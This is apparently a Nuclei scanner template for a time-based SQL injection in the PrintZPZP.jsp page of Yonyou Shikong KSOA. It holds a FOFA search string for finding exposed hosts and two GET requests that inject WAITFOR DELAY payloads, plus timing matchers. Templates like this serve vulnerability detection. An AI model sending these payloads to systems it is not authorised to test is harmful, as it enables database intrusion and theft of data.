id: yongyoushikong-KSOA-PrintZPZP-sql

info:
  name: 用友时空KSOA PrintZPZP.jsp SQL延时注入漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: app="用友-时空KSOA"
      用友时空KSOA系统PrintZPZP.jsp组件存在SQL延时注入漏洞。攻击者可通过构造恶意SQL查询语句实现数据库敏感信息获取，在特定权限条件下可进一步执行服务器端文件写入操作，导致数据库泄露风险及潜在系统权限提升威胁。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/140864484
  tags: 用友时空KSOA



http:
- raw:
  - |
    GET /kp/PrintZPZP.jsp?zpshqid=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
    Host: {{Hostname}}


  - |
    GET /kp/PrintZPZP.jsp?zpshqid=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}


  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and







